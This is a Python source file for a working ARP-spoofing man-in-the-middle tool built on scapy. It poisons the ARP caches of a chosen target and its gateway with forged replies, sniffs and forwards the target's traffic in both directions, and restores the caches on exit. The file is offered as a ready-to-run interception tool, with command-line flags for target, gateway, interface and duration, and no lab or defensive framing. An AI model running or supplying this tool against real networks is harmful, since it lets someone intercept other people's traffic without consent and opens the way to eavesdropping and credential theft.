from scapy.all import ARP, Ether, sr1, send, sniff, IP, get_if_hwaddr
import colorama, time, threading, sys, subprocess

REQUIRED_FLAGS  = [ '-t' ]
HELP_FLAG = '-h'

SOURCE    = None
TARGET    = None
GATEWAY   = None
INTERFACE = "Wi-Fi"
LENGTH    = 45
TIMEOUT   = 4
INTERVAL  = 0.1
VERBOSE   = False
VERBOSER  = False

HELP_MESSAGE = f"""
ATA ({colorama.Fore.RED}Man-In-The-Middle{colorama.Fore.WHITE}):
A simple tool for packet interception.

[Required]:
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-t{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the target for the attack.

[Optional]:
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-s{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the origin of the attack.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-g{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the gateway of your network.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-i{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the desired network interface.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-l{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the length of the attack.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-d{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the packet drop interval.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-p{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the interval of each packet.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-v{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Display more information.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-v{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Display even more information.
"""

def CheckFlags(required, arguments):
	if HELP_FLAG in arguments: PrintMessage(code=1)

	for flag in required:
		if flag not in arguments: PrintMessage(code=1)

def CheckArguments(parameters):
	for argument in range(0, len(sys.argv)):
		match sys.argv[argument]:
			case '-s':
				parameters["Source"] = sys.argv[argument + 1]
			case '-t':
				parameters["Target"] = sys.argv[argument + 1]
			case '-g':
				parameters["Gateway"] = sys.argv[argument + 1]
			case '-i':
				parameters["Interface"] = sys.argv[argument + 1]
			case '-l':
				parameters["Length"] = int(sys.argv[argument + 1])
			case '-d':
				parameters["Timeout"] = int(sys.argv[argument + 1])
			case '-p':
				parameters["Interval"] = int(sys.argv[argument + 1])
			case '-v':
				parameters["Verbose"] = True
			case '-vv':
				parameters["Verboser"] = True
				parameters["Verbose"] = True
	return parameters

def PrintMessage(message="", code=-1):
	white = colorama.Fore.WHITE
	match code:
		case 0:
			print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{white}*{colorama.Style.RESET_ALL}{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
		case -1:
			print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{white}*{colorama.Style.RESET_ALL}{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
			sys.exit()
		case 1:
			print(HELP_MESSAGE)
			sys.exit()

def GetGateway(interface):
	result = subprocess.run(['ipconfig'], capture_output=True, text=True)
	detached = result.stdout.splitlines()

	adapter_found = False
	for line in detached:
		if interface in line:
			adapter_found = True
		if adapter_found and "Gateway" in line:
			return line.split(":")[-1].strip()
	PrintMessage("Failed to resolve default gateway, please use -g.", -1)

def GetMAC(destination, timeout, interface):
	arp_request = ARP(pdst=destination)
	response = sr1(arp_request, iface=interface, timeout=timeout, verbose=False)

	if response: return response.hwsrc

	PrintMessage("Failure to resolve one or more physical addresses.", -1)

def Reset(message, gateway, gateway_mac, target, target_mac):
	gateway_packet  = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=gateway_mac, hwdst=target_mac)
	target_packet = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=target_mac,  hwdst=gateway_mac)

	send(gateway_packet, count=1, verbose=False)
	send(target_packet,  count=1, verbose=False)

	PrintMessage((gateway_packet.summary(), target_packet.summary()), 0)
	PrintMessage(message, -1)

def Spoof(verbose, interval, gateway, gateway_mac, target, target_mac, attacker_mac):
	while not stop_event.is_set():
		gateway_packet  = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=attacker_mac, hwdst=target_mac)
		target_packet = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=attacker_mac, hwdst=gateway_mac)
		
		if verbose: PrintMessage((target_packet.summary(), gateway_packet.summary()), 0)

		send(gateway_packet, count=1, verbose=False)
		send(target_packet,  count=1, verbose=False)

		time.sleep(interval)

def ForwardSent(verbose, target, interface):
	while not stop_event.is_set():
		packet = sniff(filter="ip", iface=interface, count=1)[0]

		if not packet.haslayer(IP): continue

		if packet[IP].src == target:
			if verbose: PrintMessage(f"(Sent) {packet.summary()}", 0)
			send(packet, iface=interface, count=1, verbose=False)

def ForwardReceived(verbose, target, interface):
	while not stop_event.is_set():
		packet = sniff(filter="ip", iface=interface, count=1)[0]

		if not packet.haslayer(IP): continue

		if packet[IP].dst == target:
			if verbose: PrintMessage(f"(Received) {packet.summary()}", 0)
			send(packet, iface=interface, count=1, verbose=False)

try:
	stop_event = threading.Event()

	CheckFlags(REQUIRED_FLAGS, sys.argv)

	functional_parameters = {
		"Source":    None,
		"Target":    None,
		"Gateway":   None,
		"Interface": INTERFACE,
		"Length":    LENGTH,
		"Timeout":   TIMEOUT,
		"Interval":  INTERVAL,
		"Verbose":   VERBOSE,
		"Verboser":  VERBOSER
	}

	CheckArguments(functional_parameters)

	if not functional_parameters["Gateway"]:
		functional_parameters["Gateway"] = GetGateway(functional_parameters["Interface"])

	attacker_mac  = get_if_hwaddr(functional_parameters["Interface"])
	target_mac    = GetMAC(functional_parameters["Target"], functional_parameters["Timeout"], functional_parameters["Interface"])
	gateway_mac   = GetMAC(functional_parameters["Gateway"], functional_parameters["Timeout"], functional_parameters["Interface"])

	PrintMessage(f"(Attacker) {attacker_mac} (Target) {target_mac} (Gateway) {gateway_mac}", 0)

	spoof_thread = threading.Thread(target=Spoof, args=
	(
		functional_parameters["Verboser"],
		functional_parameters["Interval"],
		functional_parameters["Gateway"],
		gateway_mac,
		functional_parameters["Target"],
		target_mac,
		attacker_mac
	))

	sending_thread   = threading.Thread(target=ForwardSent,     args=(functional_parameters["Verbose"], functional_parameters["Target"], functional_parameters["Interface"]))
	receiving_thread = threading.Thread(target=ForwardReceived, args=(functional_parameters["Verbose"], functional_parameters["Target"], functional_parameters["Interface"]))

	spoof_thread.start()
	sending_thread.start()
	receiving_thread.start()

	counter = 0
	while counter < LENGTH:
		counter += 1
		time.sleep(1)

	stop_event.set()

	spoof_thread.join()
	sending_thread.join()
	receiving_thread.join()

	Reset("Exiting gracefully.", functional_parameters["Gateway"], gateway_mac, functional_parameters["Target"], target_mac)
except KeyboardInterrupt:
	stop_event.set()

	spoof_thread.join()
	sending_thread.join()
	receiving_thread.join()

	Reset("Caught keyboard interruption.", functional_parameters["Gateway"], gateway_mac, functional_parameters["Target"], target_mac)